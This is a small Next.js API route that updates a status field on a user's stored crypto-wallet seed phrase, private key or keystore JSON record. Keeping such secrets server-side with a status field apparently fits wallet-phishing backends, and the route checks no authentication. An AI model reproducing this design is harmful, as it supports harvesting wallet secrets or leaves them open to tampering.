import SeedPhrase from "@/models/SeedPhrase";
import PrivateKey from "@/models/PrivateKey";
import KeystoreJson from "@/models/KeystoreJson";

export async function POST(req) {
  const { userId, itemType, status } = await req.json();

  let model;
  if (itemType === "seedWords") model = SeedPhrase;
  else if (itemType === "privateKey") model = PrivateKey;
  else if (itemType === "keystoreJson") model = KeystoreJson;
  else return Response.json({ error: "Invalid itemType" }, { status: 400 });

  const updated = await model.findOneAndUpdate(
    { userId },
    { status },
    { new: true }
  );

  if (!updated) return Response.json({ error: "Not found" }, { status: 404 });
  return Response.json({ success: true, status: updated.status });
}